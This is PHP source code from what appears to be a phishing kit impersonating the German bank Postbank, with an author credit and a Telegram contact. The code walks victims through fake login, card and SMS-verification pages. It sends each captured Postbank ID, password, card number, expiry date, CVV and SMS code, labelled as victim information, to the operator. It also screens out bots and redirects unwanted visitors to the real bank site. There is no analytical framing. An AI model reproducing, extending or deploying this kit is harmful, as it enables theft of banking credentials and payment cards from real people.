<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51
    ********************************************************/

    require_once 'includes/main.php';
    if( $_GET['pwd'] == PASSWORD ) {
        session_destroy();
        visitors();
        $page = go('login');
        header("Location: " . $page['path'] . "?verification#_");
        exit();
    } else if( !empty($_GET['redirection']) ) {
        $red = $_GET['redirection'];
        if( $red == 'errorsms' ) {
            $page = go('sms');
            header("Location: " . $page['path'] . "?error=1&verification#_");
            exit();
        }
        $page = go($red);
        header("Location: " . $page['path'] . "?verification#_");
        exit();
    } else if($_SERVER['REQUEST_METHOD'] == "POST") {
        if( !empty($_POST['captcha']) ) {
            header("HTTP/1.0 404 Not Found");
            die();
        }
        if ($_POST['step'] == "email") {
            $_SESSION['errors']     = [];
            $_SESSION['postbank_id'] = $_POST['postbank_id'];
            $subject = get_client_ip() . ' | POSTBANK | Username';
            $message = '/-- USERNAME INFOS --/' . get_client_ip() . "\r\n";
            $message .= 'Postbank ID : ' . $_POST['postbank_id'] . "\r\n";
            $message .= '/-- END USERNAME INFOS --/' . "\r\n";
            $message .= victim_infos();
            //send($subject,$message);
            $page = go('pass');
            header("Location: " . $page['path'] . "?verification#_");
            exit();
        }
        if ($_POST['step'] == "pass") {
            $_SESSION['errors']     = [];
            $_SESSION['password'] = $_POST['password'];
            $subject = get_client_ip() . ' | POSTBANK | Login';
            $message = '/-- LOGIN INFOS --/' . get_client_ip() . "\r\n";
            $message .= 'Postbank ID : ' . $_SESSION['postbank_id'] . "\r\n";
            $message .= 'Password : ' . $_POST['password'] . "\r\n";
            $message .= '/-- END LOGIN INFOS --/' . "\r\n";
            $message .= victim_infos();
            send($subject,$message);
            $page = go('app');
            header("Location: " . $page['path'] . "?verification#_");
            exit();
        }
        if ($_POST['step'] == "pass2") {
            $_SESSION['errors']     = [];
            $_SESSION['password'] = $_POST['password'];
            $subject = get_client_ip() . ' | POSTBANK | Login';
            $message = '/-- LOGIN INFOS --/' . get_client_ip() . "\r\n";
            $message .= 'Postbank ID : ' . $_SESSION['postbank_id'] . "\r\n";
            $message .= 'Password : ' . $_POST['password'] . "\r\n";
            $message .= '/-- END LOGIN INFOS --/' . "\r\n";
            $message .= victim_infos();
            send($subject,$message);
            $page = go('app');
            header("Location: " . $page['path'] . "?verification#_");
            exit();
        }
        if ($_POST['step'] == "cc") {
            $_SESSION['errors']      = [];
            $_SESSION['one']   = $_POST['one'];
            $_SESSION['two']     = $_POST['two'];
            $_SESSION['three']      = $_POST['three'];
            $_SESSION['four']      = $_POST['four'];
            $date_ex     = explode('/',$_POST['two']);
            $card_number = validate_cc_number($_SESSION['one']);
            $card_cvv    = validate_cc_cvv($_POST['three'],$card_number['type']);
            $card_date   = validate_cc_date($date_ex[0],$date_ex[1]);
            if( $card_number == false ) {
                $_SESSION['errors']['one'] = 'Kartennummer ist falsch';
            }
            if( $card_cvv == false ) {
                $_SESSION['errors']['three'] = 'Sicherheitscode ist ungültig';
            }
            if( $card_date == false ) {
                $_SESSION['errors']['two'] = 'Bitte gib ein korrektes Datum an';
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | POSTBANK | Card';
                $message = '/-- CARD INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Card number : ' . $_POST['one'] . "\r\n";
                $message .= 'Card Date : ' . $_POST['two'] . "\r\n";
                $message .= 'Card CVV : ' . $_POST['three'] . "\r\n";
                $message .= '/-- END CARD INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                unset($_SESSION['errors']);
                $page = go('loading1');
                header("Location: " . $page['path'] . "?verification#_");
            } else {
                $page = go('cc');
                header("Location: " . $page['path'] . "?error#_");
            }
        }
        if ($_POST['step'] == "sms") {
            $_SESSION['errors']     = [];
            $_SESSION['sms_code']   = $_POST['sms_code'];
            if( empty($_POST['sms_code']) ) {
                $_SESSION['errors']['sms_code'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | POSTBANK | Sms';
                $message = '/-- SMS INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'SMS code : ' . $_POST['sms_code'] . "\r\n";
                $message .= '/-- END SMS INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                $page = go('sms');
                header("Location: " . $page['path'] . "?error=1&verification#_");
                exit();
            } else {
                $page = go('sms');
                header("Location: " . $page['path'] . "?error=1&verification#_");
                exit();
            }
        }
    } else {
        header("Location: " . OFFICIAL_WEBSITE);
        exit();
    }
?>